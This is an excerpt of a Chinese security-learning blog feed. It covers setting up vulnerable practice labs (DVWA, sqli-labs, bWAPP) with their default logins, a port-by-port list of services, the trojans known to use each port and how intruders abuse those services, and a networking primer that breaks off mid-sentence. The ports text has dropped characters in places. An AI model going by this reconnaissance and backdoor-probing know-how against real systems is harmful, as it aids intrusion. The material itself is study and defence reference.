    <content type="html"><![CDATA[<p>平台：DVWA sqli-labs upload-labs xss-labs xxe-labs ssrf-labs bwapp</p><h1 id="SQLi-LABS"><a href="#SQLi-LABS" class="headerlink" title="SQLi-LABS"></a>SQLi-LABS</h1><p>搭建出现的问题，由于PHPstudy的版本原因，搭建出现问题，需要更改数据库名，更改面积大，直接虚拟机开低版本搭建<br>学长语：直接解压sqli-labs到www根目录下就行了啊<br>我…还真是，上图<br><img src="https://img-blog.csdnimg.cn/2020112408582051.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70#pic_center"><br><img src="https://img-blog.csdnimg.cn/20201124102250936.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70#pic_center"><br>注意：需要更改sqli-labs-master\sql-connections下的db-creds.inc，设置登录密码。</p><h1 id="DVWA"><a href="#DVWA" class="headerlink" title="DVWA"></a>DVWA</h1><p><img src="https://img-blog.csdnimg.cn/20201206145227918.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_16,color_FFFFFF,t_70"><br><code>Ⅰ需要修改当前php版本里的php.ini配置文件 更改allow_url_include = off 为On ==（吐了，大写的O）== 而且要重启php服务 Ⅱ绑定域名，进行本地DNS更新，网上查找www.DVWA.com的密钥</code><br>网站初次登入密码:admin/password</p><h1 id="BWAPP"><a href="#BWAPP" class="headerlink" title="BWAPP"></a>BWAPP</h1><p>进入bwapp里admin，更改settings更改密码<br>登录网站后出现<code>Connection failed: Unknown database &#39;bWAPP&#39;</code><br>进入localhost/bwap/install.php,点击here<br>网站初次登入密码：bee/bug</p>]]></content>
    
    
    <categories>
      
      <category>debug</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-training</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>常见端口及其服务</title>
    <link href="/2020/12/04/%E5%B8%B8%E8%A7%81%E7%AB%AF%E5%8F%A3%E5%8F%8A%E5%85%B6%E6%9C%8D%E5%8A%A1/"/>
    <url>/2020/12/04/%E5%B8%B8%E8%A7%81%E7%AB%AF%E5%8F%A3%E5%8F%8A%E5%85%B6%E6%9C%8D%E5%8A%A1/</url>
    
    <content type="html"><![CDATA[<p>  0<br>  Reserved<br>  通常用于分析操作系统。这一方法能够工作是因为在一些系统中“0”是无效 ，当你试图使用通常的闭合 连接它时将产生不同的结果。一种典型的扫描，使用IP地址为0.0.0.0，设置ACK位并在以太网层广播。<br>  1<br>  tcpmux<br>  这显示有人在寻找SGI Irix机器。Irix是实现tcpmux的主要提供者，默认情况下tcpmux在这种系统中被打开。Irix机器在发布是含有几个默认的无密码的帐户，如 IP、GUEST UUCP、NUUCP、DEMOS 、TUTOR、DIAG、OUTOFBOX等。许多管理员在安装后忘记删除这些帐户。因此HACKER在INTERNET上搜索tcpmux并利用这些帐户。</p><p>  7<br>  Echo<br>  能看到许多人搜索Fraggle放大器时，发送到X.X.X.0和X.X.X.255的信息。</p><p>  19<br>  Character Generator<br>  这是一种仅仅发送字符的 。UDP版本将会在收到UDP包后回应含有垃圾字符的包。TCP连接时会发送含有垃圾字符的数据流直到连接关闭。HACKER利用IP欺骗可以发动DoS攻击。伪造两个chargen 器之间的UDP包。同样Fraggle DoS攻击向目标地址的这个 广播一个带有伪造受害者IP的数据包，受害者为了回应这些数据而过载。</p><p>  21<br>  FTP<br>  FTP 器所开放的 ，用于上传、下载。最常见的攻击者用于寻找打开anonymous的FTP 器的方法。这些 器带有可读写的目录。木马Doly Trojan、Fore、Invisible FTP、WebEx、WinCrash和Blade Runner所开放的 。</p><p>  22<br>  Ssh<br>  PcAnywhere建立的TCP和这一 的连接可能是为了寻找ssh。这一 有许多弱点，如果配置成特定的模式，许多使用RSAREF库的版本就会有不少的漏洞存在。</p><p>  23<br>  Telnet<br>  远程登录，入侵者在搜索远程登录UNIX的 。大多数情况下扫描这一 是为了找到机器运行的操作系统。还有使用其他技术，入侵者也会找到密码。木马Tiny Telnet Server就开放这个 。</p><p>  25<br>  SMTP<br>  SMTP 器所开放的 ，用于发送邮件。入侵者寻找SMTP 器是为了传递他们的SPAM。入侵者的帐户被关闭，他们需要连接到高带宽的E-MAIL 器上，将简单的信息传递到不同的地址。木马Antigen、Email Password Sender、Haebu Coceda、Shtrilitz Stealth、WinPC、WinSpy都开放这个 。</p><p>  31<br>  MSG Authentication<br>  木马Master Paradise、Hackers Paradise开放此 。</p><p>  42<br>  WINS Replication<br>  WINS复制</p><p>  53<br>  Domain Name Server（DNS）<br>  DNS 器所开放的 ，入侵者可能是试图进行区域传递（TCP），欺骗DNS（UDP）或隐藏其他的通信。因此防火墙常常过滤或记录此 。</p><p>  67<br>  Bootstrap Protocol Server<br>  通过DSL和Cable modem的防火墙常会看见大量发送到广播地址255.255.255.255的数据。这些机器在向DHCP 器请求一个地址。HACKER常进入它们，分配一个地址把自己作为局部路由器而发起大量中间人（man-in-middle）攻击。客户端向68 广播请求配置， 器向67 广播回应请求。这种回应使用广播是因为客户端还不知道可以发送的IP地址。</p><p>  69<br>  Trival File Transfer<br>  许多 器与bootp一起提供这项 ，便于从系统下载启动代码。但是它们常常由于错误配置而使入侵者能从系统中窃取任何 文件。它们也可用于系统写入文件。</p><p>  79<br>  Finger Server<br>  入侵者用于获得用户信息，查询操作系统，探测已知的缓冲区溢出错误，回应从自己机器到其他机器Finger扫描。</p><p>  80<br>  HTTP<br>  用于网页浏览。木马Executor开放此 。</p><p>  99<br>  Metagram Relay<br>  后门程序ncx99开放此 。</p><p>  102<br>  Message transfer agent(MTA)-X.400 over TCP/IP<br>  消息传输代理。</p><p>  109<br>  Post Office Protocol -Version3<br>  POP3 器开放此 ，用于接收邮件，客户端访问 器端的邮件 。POP3 有许多公认的弱点。关于用户名和密码交 换缓冲区溢出的弱点至少有20个，这意味着入侵者可以在真正登陆前进入系统。成功登陆后还有其他缓冲区溢出错误。</p><p>  110<br>  SUN公司的RPC 所有<br>  常见RPC 有rpc.mountd、NFS、rpc.statd、rpc.csmd、rpc.ttybd、amd等</p><p>  113<br>  Authentication Service<br>  这是一个许多计算机上运行的协议，用于鉴别TCP连接的用户。使用标准的这种 可以获得许多计算机的信息。但是它可作为许多 的记录器，尤其是FTP、POP、IMAP、SMTP和IRC等 。通常如果有许多客户通过防火墙访问这些 ，将会看到许多这个 的连接请求。记住，如果阻断这个 客户端会感觉到在防火墙另一边与E-MAIL 器的缓慢连接。许多防火墙支持TCP连接的阻断过程中发回RST。这将会停止缓慢的连接。</p><p>  119<br>  Network News Transfer Protocol<br>  NEWS新闻组传输协议，承载USENET通信。这个 的连接通常是人们在寻找USENET 器。多数ISP限制，只有他们的客户才能访问他们的新闻组 器。打开新闻组 器将允许发/读任何人的帖子，访问被限制的新闻组 器，匿名发帖或发送SPAM。</p><p>  135<br>  Location Service<br>  Microsoft在这个 运行DCE RPC end-point mapper为它的DCOM 。这与UNIX 111 的功能很相似。使用DCOM和RPC的 利用计算机上的end-point mapper注册它们的位置。远端客户连接到计算机时，它们查找end-point mapper找到 的位置。HACKER扫描计算机的这个 是为了找到这个计算机上运行Exchange Server吗？什么版本？还有些DOS攻击直接针对这个 。</p><p>  137、138、139<br>  NETBIOS Name Service<br>  其中137、138是UDP ，当通过网上邻居传输文件时用这个 。而139  通过这个 进入的连接试图获得NetBIOS/SMB 。这个协议被用于windows文件和打印机共享和SAMBA。还有WINS Regisrtation也用它。</p><p>  143<br>  Interim Mail Access Protocol v2<br>  和POP3的安全问题一样，许多IMAP 器存在有缓冲区溢出漏洞。记住 一种LINUX蠕虫（admv0rm）会通过这个 繁殖，因此许多这个 的扫描来自不知情的已经被感染的用户。当REDHAT在他们的LINUX发布版本中默认允许IMAP后，这些漏洞变的很流行。这一 还被用于IMAP2，但并不流行。</p><p>  161<br>  SNMP<br>  SNMP允许远程管理设备。所有配置和运行信息的储存在数据库中，通过SNMP可获得这些信息。许多管理员的错误配置将被暴露在Internet。Cackers将试图使用默认的密码public、private访问系统。他们可能会试验所有可能的组合。SNMP包可能会被错误的指向用户的网络。</p><p>  177<br>  X Display Manager Control Protocol<br>  许多入侵者通过它访问X-windows操作台，它同时需要打开6000 。</p><p>  389<br>  LDAP、ILS<br>  轻型目录访问协议和NetMeeting Internet Locator Server共用这一 。</p><p>  443<br>  Https<br>  网页浏览 ，能提供加密和通过安全 传输的另一种HTTP。</p><p>  456<br>  [NULL]<br>  木马HACKERS PARADISE开放此 。</p><p>  513<br>  Login,remote login<br>  是从使用cable modem或DSL登陆到子网中的UNIX计算机发出的广播。这些人为入侵者进入他们的系统提供了信息。</p><p>  544<br>  [NULL]<br>  kerberos kshell</p><p>  548<br>  Macintosh,File Services(AFP/IP)<br>  Macintosh,文件 。</p><p>  553<br>  CORBA IIOP （UDP）<br>  使用cable modem、DSL或VLAN将会看到这个 的广播。CORBA是一种面向对象的RPC系统。入侵者可以利用这些信息进入系统。</p><p>  555<br>  DSF<br>  木马PhAse1.0、Stealth Spy、IniKiller开放此 。</p><p>  568<br>  Membership DPA<br>  成员资格 DPA。</p><p>  569<br>  Membership MSN<br>  成员资格 MSN。</p><p>  635<br>  mountd<br>  Linux的mountd Bug。这是扫描的一个流行BUG。大多数对这个 的扫描是基于UDP的，但是基于TCP的mountd有所增加（mountd同时运行于两个 ）。记住mountd可运行于任何 （到底是哪个 ，需要在 111做portmap查询），只是Linux默认 是635，就像NFS通常运行于2049 。</p><p>  636<br>  LDAP<br>  SSL（Secure Sockets layer）</p><p>  666<br>  Doom Id Software<br>  木马Attack FTP、Satanz Backdoor开放此 </p><p>  993<br>  IMAP<br>  SSL（Secure Sockets layer）</p><p>  1001、1011<br>  [NULL]<br>  木马Silencer、WebEx开放1001 。木马Doly Trojan开放1011 。</p><p>  1024<br>  Reserved<br>  它是动态 的开始，许多程序并不在乎用哪个 连接网络，它们请求系统为它们分配下一个闲置 。基于这一点分配从 1024开始。这就是说第一个向系统发出请求的会分配到1024 。你可以重启机器，打开Telnet，再打开一个窗口运行natstat -a 将会看到Telnet被分配1024 。还有SQL session也用此 和5000 。</p><p>  1025、1033<br>  1025 network blackjack 1033 [NULL]<br>  木马netspy开放这2个 。</p><p>  1080<br>  SOCKS<br>  这一协议以通道方式穿过防火墙，允许防火墙后面的人通过一个IP地址访问INTERNET。理论上它应该只允许内部的通信向外到达INTERNET。但是由于错误的配置，它会允许位于防火墙外部的攻击穿过防火墙。WinGate常会发生这种错误，在加入IRC聊天室时常会看到这种情况。<br>  1170<br>  [NULL]<br>  木马Streaming Audio Trojan、Psyber Stream Server、Voice开放此 。</p><p>  1234、1243、6711、6776<br>  [NULL]<br>  木马SubSeven2.0、Ultors Trojan开放1234、6776 。木马SubSeven1.0/1.9开放1243、6711、6776 。</p><p>  1245<br>  [NULL]<br>  木马Vodoo开放此 。</p><p>  1433<br>  SQL<br>  Microsoft的SQL 开放的 。</p><p>  1492<br>  stone-design-1<br>  木马FTP99CMP开放此 。</p><p>  1500<br>  RPC client fixed port session queries<br>  RPC客户固定 会话查询</p><p>  1503<br>  NetMeeting T.120<br>  NetMeeting T.120</p><p>  1524<br>  ingress<br>  许多攻击脚本将安装一个后门SHELL于这个 ，尤其是针对SUN系统中Sendmail和RPC 漏洞的脚本。如果刚安装了防火墙就看到在这个 上的连接企图，很可能是上述原因。可以试试Telnet到用户的计算机上的这个 ，看看它是否会给你一个SHELL。连接到600/pcserver也存在这个问题。</p><p>  1600<br>  issd<br>  木马Shivka-Burka开放此 。</p><p>  1720<br>  NetMeeting<br>  NetMeeting H.233 call Setup。</p><p>  1731<br>  NetMeeting Audio Call Control<br>  NetMeeting音频调用控制。</p><p>  1807<br>  [NULL]<br>  木马SpySender开放此 。</p><p>  1981<br>  [NULL]<br>  木马ShockRave开放此 。</p><p>  1999<br>  cisco identification port<br>  木马BackDoor开放此 。</p><p>  2000<br>  [NULL]<br>  木马GirlFriend 1.3、Millenium 1.0开放此 。</p><p>  2001<br>  [NULL]<br>  木马Millenium 1.0、Trojan Cow开放此 。</p><p>  2023<br>  xinuexpansion 4<br>  木马Pass Ripper开放此 。</p><p>  2049<br>  NFS<br>  NFS程序常运行于这个 。通常需要访问Portmapper查询这个 运行于哪个 。</p><p>  2115<br>  [NULL]<br>  木马Bugs开放此 。</p><p>  2140、3150<br>  [NULL]<br>  木马Deep Throat 1.0/3.0开放此 。</p><p>  2500<br>  RPC client using a fixed port session replication<br>  应用固定 会话复制的RPC客户</p><p>  2583<br>  [NULL]<br>  木马Wincrash 2.0开放此 。</p><p>  2801<br>  [NULL]<br>  木马Phineas Phucker开放此 。</p><p>  3024、4092<br>  [NULL]<br>  木马WinCrash开放此 。</p><p>  3128<br>  squid<br>  这是squid HTTP代理 器的默认 。攻击者扫描这个 是为了搜寻一个代理 器而匿名访问Internet。也会看到搜索其他代理 器的 8000、8001、8080、8888。扫描这个 的另一个原因是用户正在进入聊天室。其他用户也会检验这个 以确定用户的机器是否支持代理。</p><p>  3129<br>  [NULL]<br>  木马Master Paradise开放此 。</p><p>  3150<br>  [NULL]<br>  木马The Invasor开放此 。</p><p>  3210、4321<br>  [NULL]<br>  木马SchoolBus开放此 </p><p> 3306<br>  [NULL]<br>  mysql</p><p>  3333<br>  dec-notes<br>  木马Prosiak开放此 </p><p>  3389<br>  超级终端<br>  WINDOWS 2000终端开放此 。</p><p>  3700<br>  [NULL]<br>  木马Portal of Doom开放此 </p><p>  3996、4060<br>  [NULL]<br>  木马RemoteAnything开放此 </p><p>  4000<br>  QQ客户端<br>  腾讯QQ客户端开放此 。</p><p>  4092<br>  [NULL]<br>  木马WinCrash开放此 。</p><p>  4590<br>  [NULL]<br>  木马ICQTrojan开放此 。</p><p>  5000、5001、5321、50505<br>  [NULL]<br>  木马blazer5开放5000 。木马Sockets de Troie开放5000、5001、5321、50505 。</p><p>  5400、5401、5402<br>  [NULL]<br>  木马Blade Runner开放此 。</p><p>  5550<br>  [NULL]<br>  木马xtcp开放此 。</p><p>  5569<br>  [NULL]<br>  木马Robo-Hack开放此 。</p><p>  5632<br>  pcAnywere<br>  有时会看到很多这个 的扫描，这依赖于用户所在的位置。当用户打开pcAnywere时，它会自动扫描局域网C类网以寻找可能的代理（这里的代理是指agent而不是proxy）。入侵者也会寻找开放这种 的计算机。，所以应该查看这种扫描的源地址。一些搜寻pcAnywere的扫描包常含 22的UDP数据包。</p><p>  5742<br>  [NULL]<br>  木马WinCrash1.03开放此 。</p><p>  6267<br>  [NULL]<br>  木马广外女生开放此 。</p><p>  6400<br>  [NULL]<br>  木马The tHing开放此 。</p><p>  6670、6671<br>  [NULL]<br>  木马Deep Throat开放6670 。而Deep Throat 3.0开放6671 。</p><p>  6883<br>  [NULL]<br>  木马DeltaSource开放此 。</p><p>  6969<br>  [NULL]<br>  木马Gatecrasher、Priority开放此 。</p><p>  6970<br>  RealAudio<br>  RealAudio客户将从 器的6970-7170的UDP 接收音频数据流。这是由TCP-7070 外向控制连接设置的。</p><p>  7000<br>  [NULL]<br>  木马Remote Grab开放此 。</p><p>  7300、7301、7306、7307、7308<br>  [NULL]<br>  木马NetMonitor开放此 。另外NetSpy1.0也开放7306 。</p><p>  7323<br>  [NULL]<br>  Sygate 器端。</p><p>  7626<br>  [NULL]<br>  木马Giscier开放此 。</p><p>  7789<br>  [NULL]<br>  木马ICKiller开放此 。</p><p>  8000<br>  OICQ<br>  腾讯QQ 器端开放此 。</p><p>  8010<br>  Wingate<br>  Wingate代理开放此 。</p><p>  8080<br>  代理<br>  WWW代理开放此 。</p><p>  9400、9401、9402<br>  [NULL]<br>  木马Incommand 1.0开放此 。</p><p>  9872、9873、9874、9875、10067、10167<br>  [NULL]<br>  木马Portal of Doom开放此 。</p><p>  9989<br>  [NULL]<br>  木马iNi-Killer开放此 。</p><p>  11000<br>  [NULL]<br>  木马SennaSpy开放此 。</p><p>  11223<br>  [NULL]<br>  木马Progenic trojan开放此 。</p><p>  12076、61466<br>  [NULL]<br>  木马Telecommando开放此 。<br>page]<br>  12223<br>  [NULL]<br>  木马Hack’99 KeyLogger开放此 。</p><p>  12345、12346<br>  [NULL]<br>  木马NetBus1.60/1.70、GabanBus开放此 。</p><p>  12361<br>  [NULL]<br>  木马Whack-a-mole开放此 。</p><p>  13223<br>  PowWow<br>  PowWow是Tribal Voice的聊天程序。它允许用户在此 打开私人聊天的连接。这一程序对于建立连接非常具有攻击性。它会驻扎在这个TCP 等回应。造成类似心跳间隔的连接请求。如果一个拨号用户从另一个聊天者手中继承了IP地址就会发生好象有很多不同的人在测试这个 的情况。这一协议使用OPNG作为其连接请求的前4个字节。</p><p>  16969<br>  [NULL]<br>  木马Priority开放此 。</p><p>  17027<br>  Conducent<br>  这是一个外向连接。这是由于公司内部有人安装了带有Conducent”adbot”的共享软件。Conducent”adbot”是为共享软件显示广告 的。使用这种 的一种流行的软件是Pkware。</p><p>  19191<br>  [NULL]<br>  木马蓝色火焰开放此 。</p><p>  20000、20001<br>  [NULL]<br>  木马Millennium开放此 。</p><p>  20034<br>  [NULL]<br>  木马NetBus Pro开放此 。</p><p>  21554<br>  [NULL]<br>  木马GirlFriend开放此 。</p><p>  22222<br>  [NULL]<br>  木马Prosiak开放此 。</p><p>  23456<br>  [NULL]<br>  木马Evil FTP、Ugly FTP开放此 。</p><p>  26274、47262<br>  [NULL]<br>  木马Delta开放此 。</p><p>  27374<br>  [NULL]<br>  木马Subseven 2.1开放此 。</p><p>  30100<br>  [NULL]<br>  木马NetSphere开放此 。</p><p>  30303<br>  [NULL]<br>  木马Socket23开放此 。</p><p>  30999<br>  [NULL]<br>  木马Kuang开放此 。</p><p>  31337、31338<br>  [NULL]<br>  木马BO(Back Orifice)开放此 。另外木马DeepBO也开放31338 。</p><p>  31339<br>  [NULL]<br>  木马NetSpy DK开放此 。</p><p>  31666<br>  [NULL]<br>  木马BOWhack开放此 。</p><p>  33333<br>  [NULL]<br>  木马Prosiak开放此 。</p><p>  34324<br>  [NULL]<br>  木马Tiny Telnet Server、BigGluck、TN开放此 。</p><p>  40412<br>  [NULL]<br>  木马The Spy开放此 。</p><p>  40421、40422、40423、40426、<br>  [NULL]<br>  木马Masters Paradise开放此 。</p><p>  43210、54321<br>  [NULL]<br>  木马SchoolBus 1.0/2.0开放此 。</p><p>  44445<br>  [NULL]<br>  木马Happypig开放此 。</p><p>  50766<br>  [NULL]<br>  木马Fore开放此 。</p><p>  53001<br>  [NULL]<br>  木马Remote Windows Shutdown开放此 。</p><p>  65000<br>  [NULL]<br>  木马Devil 1.03开放此 。</p><p>  88<br>  Kerberos krb5。另外TCP的88 也是这个用途。</p><p>  137<br>  SQL Named Pipes encryption over other protocols name lookup(其他协议名称查找上的SQL命名管道加密技术)和SQL RPC encryption over other protocols name lookup(其他协议名称查找上的SQL RPC加密技术)和Wins NetBT name service(WINS NetBT名称 )和Wins Proxy都用这个 。</p><p>  161<br>  Simple Network Management Protocol(SMTP)（简单网络管理协议）。</p><p>  162<br>  SNMP Trap（SNMP陷阱）</p><p>  445<br>  Common Internet File System(CIFS)（公共Internet文件系统）</p><p>  464<br>  Kerberos kpasswd(v5)。另外TCP的464 也是这个用途。</p><p>  500<br>  Internet Key Exchange(IKE)（Internet密钥交换）</p><p>  1645、1812<br>  Remot Authentication Dial-In User Service(RADIUS)authentication(Routing and Remote Access)(远程认证拨号用户 )</p><p>  1646、1813<br>  RADIUS accounting(Routing and Remote Access)(RADIUS记帐（路由和远程访问）)</p><p>  1701<br>  Layer Two Tunneling Protocol(L2TP)(第2层隧道协议)</p><p>  1801、3527<br>  Microsoft Message Queue Server(Microsoft消息队列 器)。还有TCP的135、1801、2101、2103、2105也是同样的用途。</p><p>  2504<br>  Network Load Balancing(网络平衡负荷)</p>]]></content>
    
    
    <categories>
      
      <category>network</category>
      
    </categories>
    
    
    <tags>
      
      <tag>knowledge</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>计算机网络基础</title>
    <link href="/2020/12/04/%E8%AE%A1%E7%BD%91/"/>
    <url>/2020/12/04/%E8%AE%A1%E7%BD%91/</url>
    
    <content type="html"><![CDATA[<h1 id="一、网络模型"><a href="#一、网络模型" class="headerlink" title="一、网络模型"></a>一、网络模型</h1><p>不同划分方式下的网络体系模型<br><img src="https://img-blog.csdnimg.cn/20201203132129490.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"><img src="https://img-blog.csdnimg.cn/20201203133326473.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"><br><img src="https://img-blog.csdnimg.cn/20201203224110893.gif"></p><hr><h1 id="二、各层介绍"><a href="#二、各层介绍" class="headerlink" title="二、各层介绍"></a>二、各层介绍</h1><p>1）<strong>物理层（Physical Layer）</strong></p><p>激活、维持、关闭通信端点之间的机械特性、电气特性、功能特性以及过程特性。该层为上层协议提供了一个传输数据的可靠的物理媒体。简单的说，物理层确保原始的数据可在各种物理媒体上传输。物理层记住两个重要的设备名称，中继器（Repeater，也叫放大器）和集线器。</p><p>2）<strong>数据链路层（Data Link Layer）</strong></p><p>数据链路层在物理层提供的服务的基础上向网络层提供服务，其最基本的服务是将源自网络层来的数据可靠地传输到相邻节点的目标机网络层。为达到这一目的，数据链路必须具备一系列相应的功能，主要有：如何将数据组合成数据块，在数据链路层中称这种数据块为帧（frame），帧是数据链路层的传送单位；如何控制帧在物理信道上的传输，包括如何处理传输差错，如何调节发送速率以使与接收方相匹配；以及在两个网络实体之间提供数据链路通路的建立、维持和释放的管理。数据链路层在不可靠的物理介质上提供可靠的传输。该层的作用包括：物理地址寻址、数据的成帧、流量控制、数据的检错、重发等。</p><ul><li>数据链路层为网络层提供可靠的数据传输；</li><li>基本数据单位为帧；</li><li>主要的协议：<strong>以太网协议</strong>；</li><li>两个重要设备名称：网桥和交换机。</li></ul><p>3）<strong>网络层（Network Layer）</strong></p><p>网络层的目的是实现两个端系统之间的数据透明传送，具体功能包括寻址和路由选择、连接的建立、保持和终止等。它提供的服务使传输层不需要了解网络中的数据传输和交换技术。如果您想用尽量少的词来记住网络层，那就是“路径选择、路由及逻辑寻址”。</p><p>网络层中涉及众多的协议，其中包括最重要的协议，也是TCP/IP的核心协议——IP协议。IP协议非常简单，仅仅提供不可靠、无连接的传送服务。IP协议的主要功能有：无连接数据报传输、数据报路由选择和差错控制。与IP协议配套使用实现其功能的还有地址解析协议ARP、逆地址解析协议RARP、因特网报文协议ICMP、因特网组管理协议IGMP。</p><ul><li>网络层负责对子网间的数据包进行路由选择。此外，网络层还可以实现拥塞控制、网际互连等功能；</li><li>基本数据单位为IP数据报；</li><li>包含的主要协议：<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs abnf">IP协议（Internet Protocol，因特网互联协议）<span class="hljs-comment">;</span><br><br>ICMP协议（Internet Control Message Protocol，因特网控制报文协议）<span class="hljs-comment">;</span><br><br>ARP协议（Address Resolution Protocol，地址解析协议）<span class="hljs-comment">;</span><br><br>RARP协议（Reverse Address Resolution Protocol，逆地址解析协议）。<br></code></pre></td></tr></table></figure></li><li>重要的设备：路由器。</li></ul><p>4）<strong>传输层（Transport Layer）</strong></p><p>第一个端到端，即主机到主机的层次。传输层负责将上层数据分段并提供端到端的、可靠的或不可靠的传输。此外，传输层还要处理端到端的差错控制和流量控制问题。</p><p>传输层的任务是根据通信子网的特性，最佳的利用网络资源，为两个端系统的会话层之间，提供建立、维护和取消传输连接的功能，负责端到端的可靠数据传输。在这一层，信息传送的协议数据单元称为段或报文。</p><p>网络层只是根据网络地址将源结点发出的数据包传送到目的结点，而传输层则负责将数据可靠地传送到相应的端口。</p><ul><li><p>传输层负责将上层数据分段并提供端到端的、可靠的或不可靠的传输以及端到端的差错控制和流量控制问题；</p></li><li><p>包含的主要协议：</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">TCP协议（Transmission Control Protocol，传输控制协议）<br>UDP协议（<span class="hljs-keyword">User</span> <span class="hljs-title">Datagram</span> Protocol，用户数据报协议）<br></code></pre></td></tr></table></figure></li></ul><ul><li>重要设备：网关。</li></ul><p>5）<strong>会话层</strong></p><p>会话层管理主机之间的会话进程，即负责建立、管理、终止进程之间的会话。会话层还利用在数据中插入校验点来实现数据的同步。</p><p>6）<strong>表示层</strong></p><p>表示层对上层数据或信息进行变换以保证一个主机应用层信息可以被另一个主机的应用程序理解。表示层的数据转换包括数据的加密、压缩、格式转换等。</p><p>7）<strong>应用层</strong></p><p>为操作系统或网络应用程序提供访问网络服务的接口。</p><p>会话层、表示层和应用层注意：</p><ul><li><p>数据传输基本单位为报文；</p></li><li><p>包含的主要协议：</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs arcade">FTP（文件传送协议）<br>Telnet（远程登录协议）<br>DNS（域名解析协议）<br>SMTP（邮件传送协议）<br>POP3协议（邮局协议）<br>HTTP协议（Hyper <span class="hljs-built_in">Text</span> Transfer Protocol）<br></code></pre></td></tr></table></figure></li></ul><hr><h1 id="三、硬件总结"><a href="#三、硬件总结" class="headerlink" title="三、硬件总结"></a>三、硬件总结</h1><p>1）交换机<br>在计算机网络系统中，交换机是针对共享工作模式的弱点而推出的。交换机拥有一条高带宽的背部总线和内部交换矩阵。交换机的所有的端口都挂接在这条背 部总线上，当控制电路收到数据包以后，处理端口会查找内存中的地址对照表以确定目的MAC（网卡的硬件地址）的NIC（网卡）挂接在哪个端口上，通过内部 交换矩阵迅速将数据包传送到目的端口。目的MAC若不存在，交换机才广播到所有的端口，接收端口回应后交换机会“学习”新的地址，并把它添加入内部地址表中。交换机工作于OSI参考模型的第二层，即数据链路层。交换机内部的CPU会在每个端口成功连接时，通过ARP协议学习它的MAC地址，保存成一张 ARP表。在今后的通讯中，发往该MAC地址的数据包将仅送往其对应的端口，而不是所有的端口。因此，交换机可用于划分数据链路层广播，即冲突域；但它不 能划分网络层广播，即广播域。交换机被广泛应用于二层网络交换，俗称“二层交换机”。交换机的种类有：二层交换机、三层交换机、四层交换机、七层交换机分别工作在OSI七层模型中的第二层、第三层、第四层盒第七层，并因此而得名。</p><p>2）路由器<br>路由器（Router）是一种计算机网络设备，提供了路由与转送两种重要机制，可以决定数据包从来源端到目的端所经过 的路由路径（host到host之间的传输路径），这个过程称为路由；将路由器输入端的数据包移送至适当的路由器输出端(在路由器内部进行)，这称为转送。路由工作在OSI模型的第三层——即网络层，例如网际协议。路由器的一个作用是连通不同的网络，另一个作用是选择信息传送的线路。 路由器与交换器的差别，路由器是属于OSI第三层的产品，交换器是OSI第二层的产品(这里特指二层交换机)。</p><p>3）网关<br>网关（Gateway），网关顾名思义就是连接两个网络的设备，区别于路由器（由于历史的原因，许多有关TCP/IP 的文献曾经把网络层使用的路由器（Router）称为网关，在今天很多局域网采用都是路由来接入网络，因此现在通常指的网关就是路由器的IP），经常在家 庭中或者小型企业网络中使用，用于连接局域网和Internet。 网关也经常指把一种协议转成另一种协议的设备，比如语音网关。</p><h1 id="四、-协议总结"><a href="#四、-协议总结" class="headerlink" title="四、 协议总结"></a>四、 协议总结</h1><p>物理层：RJ45、CLOCK、IEEE802.3    （中继器，集线器，网关）<br>数据链路：PPP、FR、HDLC、VLAN、MAC  （网桥，交换机）<br>网络层：<strong>IP</strong>、ICMP、<strong>ARP</strong>、RARP、OSPF、IPX、RIP、IGRP、 （路由器）<br>传输层：<strong>TCP</strong>、<strong>UDP</strong>、SPX<br>会话层：NFS、<strong>SQL</strong>、NETBIOS、RPC<br>表示层：JPEG、MPEG、ASII<br>应用层：<strong>FTP</strong>、<strong>DNS</strong>、Telnet、SMTP、<strong>HTTP</strong>、<strong>WWW</strong>、NFS</p><hr><h1 id="五、对协议的梳理"><a href="#五、对协议的梳理" class="headerlink" title="五、对协议的梳理"></a>五、对协议的梳理</h1><h2 id="MAC与IP间的协议"><a href="#MAC与IP间的协议" class="headerlink" title="MAC与IP间的协议"></a>MAC与IP间的协议</h2><p><strong>ARP协议：</strong> 负责将IP地址映射到 MAC地址</p><ul><li><input checked="" disabled="" type="checkbox"> 根据IP地址获取物理地址:<br>首先，每个主机都会在自己的ARP缓冲区中建立一个ARP列表，以表示IP地址和MAC地址之间的对应关系。当源主机要发送数据时，首先检查ARP列表中是否有对应IP地址的目的主机的MAC地址，如果有，则直接发送数据，如果没有，就向本网段的所有主机发送ARP数据包，该数据包包括的内容有：源主机 IP地址，源主机MAC地址，目的主机的IP 